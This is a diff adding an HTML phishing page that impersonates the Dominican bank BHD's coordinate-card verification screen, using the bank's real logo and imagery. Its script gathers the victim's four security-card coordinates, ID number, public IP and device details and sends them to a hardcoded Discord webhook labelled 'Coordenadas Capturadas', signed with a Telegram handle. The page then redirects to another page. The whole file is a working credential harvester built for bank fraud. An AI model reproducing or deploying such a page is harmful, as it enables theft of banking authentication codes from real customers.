@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+  <title>BHD – Tarjeta de Coordenadas</title>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bg-bottom {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 38%;
+      background: url('https://ibp.bhd.com.do/assets/img/background-login.webp')
+                  center center / cover no-repeat;
+      z-index: 0;
+    }
+
+    .bg-bottom::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 55%;
+      background: linear-gradient(to bottom, #ffffff 0%, rgba(255,255,255,0) 100%);
+      z-index: 1;
+    }
+
+    .content {
+      position: relative;
+      z-index: 2;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 24px;
+    }
+
+    .logo-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding-top: 48px;
+      padding-bottom: 20px;
+    }
+
+    .logo-wrap img {
+      height: 80px;
+      width: auto;
+    }
+
+    .card-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #222;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+
+    .card-sub {
+      font-size: 0.80rem;
+      color: #999;
+      text-align: center;
+      line-height: 1.5;
+      margin-bottom: 18px;
+    }
+
+    .tc-image {
+      width: 75%;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 3px 14px rgba(0,0,0,0.13);
+      margin-bottom: 20px;
+    }
+
+    .tc-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 10px;
+    }
+
+    .instruccion {
+      width: 100%;
+      font-size: 0.83rem;
+      font-weight: 700;
+      color: #444;
+      margin-bottom: 12px;
+    }
+
+    .coords-grid {
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+
+    .coord-box {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .coord-box label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.76rem;
+      font-weight: 700;
+      color: #555;
+    }
+
+    .coord-box label .badge {
+      background: #1a3a6b;
+      color: #fff;
+      font-size: 0.70rem;
+      font-weight: 800;
+      padding: 3px 7px;
+      border-radius: 5px;
+      letter-spacing: 0.5px;
+    }
+
+    .coord-input-wrap {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid #d0d0d0;
+      border-radius: 10px;
+      padding: 11px 10px;
+      background: #fff;
+      transition: border-color .2s;
+    }
+
+    .coord-input-wrap:focus-within {
+      border-color: #4caf50;
+      box-shadow: 0 0 0 3px rgba(76,175,80,0.10);
+    }
+
+    .coord-input-wrap input {
+      border: none;
+      outline: none;
+      font-size: max(16px, 1rem);
+      font-weight: 700;
+      color: #222;
+      background: transparent;
+      width: 100%;
+      letter-spacing: 3px;
+      text-align: center;
+    }
+
+    .coord-input-wrap input::placeholder {
+      color: #ccc;
+      font-weight: 400;
+      letter-spacing: 0;
+      font-size: 0.82rem;
+    }
+
+    .btn-confirm {
+      width: 100%;
+      padding: 17px;
+      background: linear-gradient(135deg, #4caf50, #43a047);
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 800;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(76,175,80,0.35);
+      transition: background .2s, box-shadow .2s, opacity .2s;
+    }
+
+    .btn-confirm:hover {
+      background: linear-gradient(135deg, #43a047, #388e3c);
+      box-shadow: 0 6px 22px rgba(76,175,80,0.45);
+    }
+
+    .btn-confirm:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    .spacer { flex: 1; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="bg-bottom"></div>
+
+  <div class="content">
+
+    <div class="logo-wrap">
+      <img src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg" alt="BHD Logo" />
+    </div>
+
+    <div class="card-title">Tarjeta de Coordenadas</div>
+    <div class="card-sub">Ingresa los valores indicados de tu tarjeta física de coordenadas.</div>
+
+    <div class="tc-image">
+      <img src="tc.png" alt="Tarjeta de Coordenadas BHD" />
+    </div>
+
+    <div class="instruccion">Ingresa las siguientes coordenadas:</div>
+
+    <div class="coords-grid">
+
+      <div class="coord-box">
+        <label><span class="badge">06</span> Coordenada 06</label>
+        <div class="coord-input-wrap">
+          <input type="tel" id="c06" placeholder="••••"
+                 maxlength="4" inputmode="numeric" autocomplete="off" />
+        </div>
+      </div>
+
+      <div class="coord-box">
+        <label><span class="badge">16</span> Coordenada 16</label>
+        <div class="coord-input-wrap">
+          <input type="tel" id="c16" placeholder="••••"
+                 maxlength="4" inputmode="numeric" autocomplete="off" />
+        </div>
+      </div>
+
+      <div class="coord-box">
+        <label><span class="badge">26</span> Coordenada 26</label>
+        <div class="coord-input-wrap">
+          <input type="tel" id="c26" placeholder="••••"
+                 maxlength="4" inputmode="numeric" autocomplete="off" />
+        </div>
+      </div>
+
+      <div class="coord-box">
+        <label><span class="badge">36</span> Coordenada 36</label>
+        <div class="coord-input-wrap">
+          <input type="tel" id="c36" placeholder="••••"
+                 maxlength="4" inputmode="numeric" autocomplete="off" />
+        </div>
+      </div>
+
+    </div>
+
+    <button class="btn-confirm" id="btnConfirm" type="button" onclick="confirmar()">
+      Confirmar
+    </button>
+
+    <div class="spacer"></div>
+  </div>
+</div>
+
+<script>
+  // ─────────────────────────────────────────
+  //  ⚠️ PON TU WEBHOOK DE DISCORD AQUÍ
+  // ─────────────────────────────────────────
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1503663488671809708/3Wxdjh-C8vWsIX7Ebyux2cvSY1RwWTh5PWRqVCsYFazMW_EkuwPS10jMr_vGP25Z3-fb';
+
+  // ── Leer documento desde URL ──
+  const urlParams  = new URLSearchParams(window.location.search);
+  const docFromUrl = urlParams.get('doc');
+  if (docFromUrl) localStorage.setItem('bhd_doc_session', decodeURIComponent(docFromUrl));
+
+  const DOCUMENTO = decodeURIComponent(urlParams.get('doc') || '')
+                 || localStorage.getItem('bhd_doc_session')
+                 || localStorage.getItem('bhd_usuario')
+                 || 'No disponible';
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Desconocido', device = 'Desktop';
+    if (/android/i.test(ua))          { os = 'Android'; device = '📱 Móvil'; }
+    else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = '📱 iPhone/iPad'; }
+    else if (/Windows/i.test(ua))     { os = 'Windows'; device = '🖥️ PC'; }
+    else if (/Mac/i.test(ua))         { os = 'macOS';   device = '🖥️ Mac'; }
+    else if (/Linux/i.test(ua))       { os = 'Linux';   device = '🖥️ Linux'; }
+    const browser = /Chrome/i.test(ua)  ? 'Chrome'
+                  : /Firefox/i.test(ua) ? 'Firefox'
+                  : /Safari/i.test(ua)  ? 'Safari'
+                  : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
+    return { os, device, browser };
+  }
+
+  async function getIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      return d.ip;
+    } catch { return 'No disponible'; }
+  }
+
+  async function sendToDiscord(coords, ip) {
+    const { os, device, browser } = getDeviceInfo();
+    const now   = new Date();
+    const fecha = now.toLocaleDateString('es-DO', { day:'2-digit', month:'long', year:'numeric' });
+    const hora  = now.toLocaleTimeString('es-DO', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
+
+    const payload = {
+      username: "BHD - BR0K3N",
+      avatar_url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg",
+      embeds: [{
+        title: "Coordenadas Capturadas 2 — BHD",
+        color: 0x1a3a6b,
+        thumbnail: { url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg" },
+        fields: [
+          { name: "👤  Documento de Identidad", value: `\`\`\`${DOCUMENTO}\`\`\``, inline: false },
+          { name: "📋  Coordenada 06", value: `\`\`\`${coords.c06}\`\`\``, inline: true },
+          { name: "📋  Coordenada 16", value: `\`\`\`${coords.c16}\`\`\``, inline: true },
+          { name: "📋  Coordenada 26", value: `\`\`\`${coords.c26}\`\`\``, inline: true },
+          { name: "📋  Coordenada 36", value: `\`\`\`${coords.c36}\`\`\``, inline: true },
+          { name: "🌐  IP Pública",    value: `\`${ip}\``,                 inline: true },
+          { name: "📍  Dispositivo",   value: device,                       inline: true },
+          { name: "💻  Navegador",     value: `${browser} — ${os}`,         inline: true },
+          { name: "🗓️  Fecha",         value: fecha,                        inline: true },
+          { name: "🕐  Hora",          value: hora,                         inline: true }
+        ],
+        footer: {
+          text: "Telegram: @Brknshinexxx",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/240px-Telegram_logo.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  async function confirmar() {
+    const c06 = document.getElementById('c06').value.trim();
+    const c16 = document.getElementById('c16').value.trim();
+    const c26 = document.getElementById('c26').value.trim();
+    const c36 = document.getElementById('c36').value.trim();
+
+    if (!c06 || !c16 || !c26 || !c36) {
+      alert('Por favor ingresa todos los valores de las coordenadas.');
+      return;
+    }
+
+    const btn = document.getElementById('btnConfirm');
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    try {
+      const ip = await getIP();
+      await sendToDiscord({ c06, c16, c26, c36 }, ip);
+    } catch(e) {
+      console.error('Webhook error:', e);
+    }
+
+    window.location.href = 'KO.html';
+  }
+</script>
+
+</body>
+</html>
